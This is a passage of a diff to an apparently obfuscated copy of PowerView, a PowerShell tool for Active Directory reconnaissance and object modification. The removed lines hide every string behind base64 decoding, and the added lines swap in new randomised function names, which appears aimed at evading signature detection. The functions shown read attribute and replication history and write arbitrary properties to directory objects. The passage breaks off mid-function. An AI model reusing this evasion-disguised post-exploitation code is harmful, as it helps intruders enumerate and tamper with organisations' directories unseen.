-                        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PYmplY3RdIEV4dHJhY3RlZCBkb21haW4gJyRPYmplY3REb21haW4nIGZyb20gJyRJZGVudGl0eUluc3RhbmNl")))
-                        $ObjectSearcher = ltdynu @SearcherArguments
+                        $ObjectDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
+                        $ObjectName = $IdentityInstance.Split('\')[1]
+                        $IdentityFilter += "(samAccountName=$ObjectName)"
+                        $SearcherArguments['Domain'] = $ObjectDomain
+                        Write-Verbose "[Get-DomainObject] Extracted domain '$ObjectDomain' from '$IdentityInstance'"
+                        $ObjectSearcher = vydvzz @SearcherArguments
                     }
                 }
-                elseif ($IdentityInstance.Contains(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg=="))))) {
-                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHwoc2FtQWNjb3VudE5hbWU9JElkZW50aXR5SW5zdGFuY2UpKG5hbWU9JElkZW50aXR5SW5zdGFuY2UpKGRuc2hvc3RuYW1lPSRJZGVudGl0eUluc3RhbmNlKSk=")))
+                elseif ($IdentityInstance.Contains('.')) {
+                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                 }
                 else {
-                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHwoc2FtQWNjb3VudE5hbWU9JElkZW50aXR5SW5zdGFuY2UpKG5hbWU9JElkZW50aXR5SW5zdGFuY2UpKGRpc3BsYXluYW1lPSRJZGVudGl0eUluc3RhbmNlKSk=")))
+                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                 }
             }
             if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
-                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHwkSWRlbnRpdHlGaWx0ZXIp")))
+                $Filter += "(|$IdentityFilter)"
             }
 
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) {
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PYmplY3RdIFVzaW5nIGFkZGl0aW9uYWwgTERBUCBmaWx0ZXI6ICRMREFQRmlsdGVy")))
-                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JExEQVBGaWx0ZXI=")))
+            if ($PSBoundParameters['LDAPFilter']) {
+                Write-Verbose "[Get-DomainObject] Using additional LDAP filter: $LDAPFilter"
+                $Filter += "$LDAPFilter"
             }
 
             
             $UACFilter | Where-Object {$_} | ForEach-Object {
-                if ($_ -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tk9UXy4q")))) {
+                if ($_ -match 'NOT_.*') {
                     $UACField = $_.Substring(4)
                     $UACValue = [Int]($UACEnum::$UACField)
-                    $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCEodXNlckFjY291bnRDb250cm9sOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PSRVQUNWYWx1ZSkp")))
+                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                 }
                 else {
                     $UACValue = [Int]($UACEnum::$_)
-                    $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0kVUFDVmFsdWUp")))
+                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                 }
             }
 
             if ($Filter -and $Filter -ne '') {
-                $ObjectSearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYkRmlsdGVyKQ==")))
+                $ObjectSearcher.filter = "(&$Filter)"
             }
-            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PYmplY3RdIEdldC1Eb21haW5PYmplY3QgZmlsdGVyIHN0cmluZzogezB9"))) -f $($ObjectSearcher.filter))
+            Write-Verbose ("[Get-DomainObject] Get-DomainObject filter string: {0}" -f $($ObjectSearcher.filter))
 
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmluZE9uZQ==")))]) { $Results = $ObjectSearcher.FindOne() }
+            if ($PSBoundParameters['FindOne']) { $Results = $ObjectSearcher.FindOne() }
             else { $Results = $ObjectSearcher.FindAll() }
             $Results | Where-Object {$_} | ForEach-Object {
-                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))]) {
+                if ($PSBoundParameters['Raw']) {
                     
                     $Object = $_
-                    $Object.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkFET2JqZWN0LlJhdw=="))))
+                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject.Raw')
                 }
                 else {
-                    $Object = hfjsvm -Properties $_.Properties
-                    $Object.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkFET2JqZWN0"))))
+                    $Object = tsuvgg -Properties $_.Properties
+                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject')
                 }
                 $Object
             }
             if ($Results) {
                 try { $Results.dispose() }
                 catch {
-                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PYmplY3RdIEVycm9yIGRpc3Bvc2luZyBvZiB0aGUgUmVzdWx0cyBvYmplY3Q6IHswfQ=="))) -f $_)
+                    Write-Verbose ("[Get-DomainObject] Error disposing of the Results object: {0}" -f $_)
                 }
             }
             $ObjectSearcher.dispose()
@@ -4033,7 +4037,7 @@ function kzvwpf {
 }
 
 
-function htnsht {
+function nnpprq {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
@@ -4070,7 +4074,7 @@ function htnsht {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -4093,22 +4097,22 @@ function htnsht {
 
     BEGIN {
         $SearcherArguments = @{
-            'Properties'    =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bXNkcy1yZXBsYXR0cmlidXRlbWV0YWRhdGE="))),'distinguishedname'
+            'Properties'    =   'msds-replattributemetadata','distinguishedname'
             'Raw'           =   $True
         }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $LDAPFilter }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmluZE9uZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmluZE9uZQ==")))] = $FindOne }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['FindOne']) { $SearcherArguments['FindOne'] = $FindOne }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
 
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) {
-            $PropertyFilter = $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] -Join ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("fA==")))
+        if ($PSBoundParameters['Properties']) {
+            $PropertyFilter = $PSBoundParameters['Properties'] -Join '|'
         }
         else {
             $PropertyFilter = ''
@@ -4116,26 +4120,26 @@ function htnsht {
     }
 
     PROCESS {
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $Identity }
+        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }
 
-        kzvwpf @SearcherArguments | ForEach-Object {
-            $ObjectDN = $_.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZG5hbWU=")))][0]
-            ForEach($XMLNode in $_.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bXNkcy1yZXBsYXR0cmlidXRlbWV0YWRhdGE=")))]) {
-                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RFNfUkVQTF9BVFRSX01FVEFfREFUQQ=="))) -ErrorAction SilentlyContinue
+        guawbd @SearcherArguments | ForEach-Object {
+            $ObjectDN = $_.Properties['distinguishedname'][0]
+            ForEach($XMLNode in $_.Properties['msds-replattributemetadata']) {
+                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty 'DS_REPL_ATTR_META_DATA' -ErrorAction SilentlyContinue
                 if ($TempObject) {
                     if ($TempObject.pszAttributeName -Match $PropertyFilter) {
                         $Output = New-Object PSObject
-                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0RE4="))) $ObjectDN
-                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QXR0cmlidXRlTmFtZQ=="))) $TempObject.pszAttributeName
-                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdE9yaWdpbmF0aW5nQ2hhbmdl"))) $TempObject.ftimeLastOriginatingChange
-                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VmVyc2lvbg=="))) $TempObject.dwVersion
-                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdE9yaWdpbmF0aW5nRHNhRE4="))) $TempObject.pszLastOriginatingDsaDN
-                        $Output.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkFET2JqZWN0QXR0cmlidXRlSGlzdG9yeQ=="))))
+                        $Output | Add-Member NoteProperty 'ObjectDN' $ObjectDN
+                        $Output | Add-Member NoteProperty 'AttributeName' $TempObject.pszAttributeName
+                        $Output | Add-Member NoteProperty 'LastOriginatingChange' $TempObject.ftimeLastOriginatingChange
+                        $Output | Add-Member NoteProperty 'Version' $TempObject.dwVersion
+                        $Output | Add-Member NoteProperty 'LastOriginatingDsaDN' $TempObject.pszLastOriginatingDsaDN
+                        $Output.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectAttributeHistory')
                         $Output
                     }
                 }
                 else {
-                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PYmplY3RBdHRyaWJ1dGVIaXN0b3J5XSBFcnJvciByZXRyaWV2aW5nICdtc2RzLXJlcGxhdHRyaWJ1dGVtZXRhZGF0YScgZm9yICckT2JqZWN0RE4=")))
+                    Write-Verbose "[Get-DomainObjectAttributeHistory] Error retrieving 'msds-replattributemetadata' for '$ObjectDN'"
                 }
             }
         }
@@ -4143,7 +4147,7 @@ function htnsht {
 }
 
 
-function rxzpmt {
+function pkspga {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
@@ -4180,7 +4184,7 @@ function rxzpmt {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -4203,21 +4207,21 @@ function rxzpmt {
 
     BEGIN {
         $SearcherArguments = @{
-            'Properties'    =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bXNkcy1yZXBsdmFsdWVtZXRhZGF0YQ=="))),'distinguishedname'
+            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
             'Raw'           =   $True
         }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $LDAPFilter }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
 
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) {
-            $PropertyFilter = $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] -Join ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("fA==")))
+        if ($PSBoundParameters['Properties']) {
+            $PropertyFilter = $PSBoundParameters['Properties'] -Join '|'
         }
         else {
             $PropertyFilter = ''
@@ -4225,29 +4229,29 @@ function rxzpmt {
     }
 
     PROCESS {
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $Identity }
+        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }
 
-        kzvwpf @SearcherArguments | ForEach-Object {
-            $ObjectDN = $_.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZG5hbWU=")))][0]
-            ForEach($XMLNode in $_.Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bXNkcy1yZXBsdmFsdWVtZXRhZGF0YQ==")))]) {
-                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RFNfUkVQTF9WQUxVRV9NRVRBX0RBVEE="))) -ErrorAction SilentlyContinue
+        guawbd @SearcherArguments | ForEach-Object {
+            $ObjectDN = $_.Properties['distinguishedname'][0]
+            ForEach($XMLNode in $_.Properties['msds-replvaluemetadata']) {
+                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                 if ($TempObject) {
                     if ($TempObject.pszAttributeName -Match $PropertyFilter) {
                         $Output = New-Object PSObject
-                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0RE4="))) $ObjectDN
-                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QXR0cmlidXRlTmFtZQ=="))) $TempObject.pszAttributeName
-                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QXR0cmlidXRlVmFsdWU="))) $TempObject.pszObjectDn
-                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGltZUNyZWF0ZWQ="))) $TempObject.ftimeCreated
-                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGltZURlbGV0ZWQ="))) $TempObject.ftimeDeleted
-                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdE9yaWdpbmF0aW5nQ2hhbmdl"))) $TempObject.ftimeLastOriginatingChange
-                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VmVyc2lvbg=="))) $TempObject.dwVersion
-                        $Output | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdE9yaWdpbmF0aW5nRHNhRE4="))) $TempObject.pszLastOriginatingDsaDN
-                        $Output.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkFET2JqZWN0TGlua2VkQXR0cmlidXRlSGlzdG9yeQ=="))))
+                        $Output | Add-Member NoteProperty 'ObjectDN' $ObjectDN
+                        $Output | Add-Member NoteProperty 'AttributeName' $TempObject.pszAttributeName
+                        $Output | Add-Member NoteProperty 'AttributeValue' $TempObject.pszObjectDn
+                        $Output | Add-Member NoteProperty 'TimeCreated' $TempObject.ftimeCreated
+                        $Output | Add-Member NoteProperty 'TimeDeleted' $TempObject.ftimeDeleted
+                        $Output | Add-Member NoteProperty 'LastOriginatingChange' $TempObject.ftimeLastOriginatingChange
+                        $Output | Add-Member NoteProperty 'Version' $TempObject.dwVersion
+                        $Output | Add-Member NoteProperty 'LastOriginatingDsaDN' $TempObject.pszLastOriginatingDsaDN
+                        $Output.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectLinkedAttributeHistory')
                         $Output
                     }
                 }
                 else {
-                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PYmplY3RMaW5rZWRBdHRyaWJ1dGVIaXN0b3J5XSBFcnJvciByZXRyaWV2aW5nICdtc2RzLXJlcGx2YWx1ZW1ldGFkYXRhJyBmb3IgJyRPYmplY3RETg==")))
+                    Write-Verbose "[Get-DomainObjectLinkedAttributeHistory] Error retrieving 'msds-replvaluemetadata' for '$ObjectDN'"
                 }
             }
         }
@@ -4255,7 +4259,7 @@ function rxzpmt {
 }
 
 
-function sigkvf {
+function fhotfu {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
@@ -4301,7 +4305,7 @@ function sigkvf {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -4321,45 +4325,45 @@ function sigkvf {
 
     BEGIN {
         $SearcherArguments = @{'Raw' = $True}
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $LDAPFilter }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
     }
 
     PROCESS {
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $Identity }
+        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }
 
         
-        $RawObject = kzvwpf @SearcherArguments
+        $RawObject = guawbd @SearcherArguments
 
         ForEach ($Object in $RawObject) {
 
             $Entry = $RawObject.GetDirectoryEntry()
 
-            if($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2V0")))]) {
+            if($PSBoundParameters['Set']) {
                 try {
-                    $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2V0")))].GetEnumerator() | ForEach-Object {
-                        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1NldC1Eb21haW5PYmplY3RdIFNldHRpbmcgJ3swfScgdG8gJ3sxfScgZm9yIG9iamVjdCAnezJ9"))) -f $($_.Name), $($_.Value), $($RawObject.Properties.samaccountname))
+                    $PSBoundParameters['Set'].GetEnumerator() | ForEach-Object {
+                        Write-Verbose ("[Set-DomainObject] Setting '{0}' to '{1}' for object '{2}'" -f $($_.Name), $($_.Value), $($RawObject.Properties.samaccountname))
                         $Entry.put($_.Name, $_.Value)
                     }
                     $Entry.commitchanges()
                 }
                 catch {
-                    Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1NldC1Eb21haW5PYmplY3RdIEVycm9yIHNldHRpbmcvcmVwbGFjaW5nIHByb3BlcnRpZXMgZm9yIG9iamVjdCAnezB9JyA6IHsxfQ=="))) -f $($RawObject.Properties.samaccountname), $_)
